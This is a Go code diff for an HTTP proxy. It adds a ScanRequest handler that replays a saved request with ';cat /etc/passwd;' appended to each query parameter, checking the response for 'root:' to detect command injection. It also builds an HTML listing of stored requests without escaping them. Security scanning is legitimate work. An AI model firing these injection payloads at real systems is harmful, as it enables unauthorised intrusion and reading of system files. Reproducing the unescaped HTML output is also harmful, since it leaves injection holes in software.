@@ -3,9 +3,11 @@ package delivery
 import (
 	"fmt"
 	"io"
+	"io/ioutil"
 	"log"
 	"net/http"
 	"strconv"
+	"strings"
 	"time"
 
 	"github.com/aanufriev/httpproxy/internal/pkg/models"
@@ -46,7 +48,16 @@ func (h RepeatHandler) ShowAllRequests(w http.ResponseWriter, r *http.Request) {
 
 	var response string
 	for _, request := range requests {
-		response += strconv.Itoa(int(request.ID)) + ": " + request.Method + " " + request.Scheme + "://" + request.Host + request.Path + "<br>"
+		response += strconv.Itoa(int(request.ID))
+		response += ": "
+		response += request.Method
+		response += " "
+		response += request.Scheme
+		response += "://"
+		response += request.Host
+		response += request.Path
+		response += models.StrFromEncodedParams(request.Params)
+		response += "<br>"
 	}
 
 	_, err = w.Write([]byte(
@@ -152,5 +163,72 @@ func (h RepeatHandler) RepeatRequest(w http.ResponseWriter, r *http.Request) {
 		log.Printf("transfer answer err: %v", err)
 		http.Error(w, err.Error(), http.StatusServiceUnavailable)
 		return
+	}
+}
+
+func (h RepeatHandler) ScanRequest(w http.ResponseWriter, r *http.Request) {
+	idStr, ok := mux.Vars(r)["id"]
+	if !ok {
+		log.Printf("couldn't get id")
+		w.WriteHeader(http.StatusServiceUnavailable)
+		return
+	}
+
+	id, err := strconv.Atoi(idStr)
+	if err != nil {
+		log.Printf("couldn't convert id")
+		w.WriteHeader(http.StatusServiceUnavailable)
+		return
+	}
+
+	request, err := h.proxyUsecase.GetRequest(id)
+	if err != nil {
+		log.Printf("couldn't get request: %v", err)
+		http.Error(w, err.Error(), http.StatusServiceUnavailable)
+		return
+	}
+
+	httpRequest, err := models.ConvertToHttpRequest(request)
+	if err != nil {
+		log.Printf("couldn't convert request: %v", err)
+		http.Error(w, err.Error(), http.StatusServiceUnavailable)
+		return
+	}
+
+	client := http.Client{
+		Timeout: time.Second * 10,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+
+	var resp *http.Response
+
+	query := httpRequest.URL.Query()
+	for key, values := range query {
+		for i, value := range values {
+			query[key][i] = value + ";cat /etc/passwd;"
+			httpRequest.URL.RawQuery = query.Encode()
+			fmt.Println(httpRequest.URL.Query())
+
+			resp, err = client.Do(&httpRequest)
+			if err != nil {
+				return
+			}
+			defer resp.Body.Close()
+
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				return
+			}
+
+			if strings.Contains(string(body), "root:") {
+				fmt.Println("YES")
+			}
+
+			query[key][i] = value
+			httpRequest.URL.RawQuery = query.Encode()
+			fmt.Println(httpRequest.URL.Query())
+		}
 	}
 }
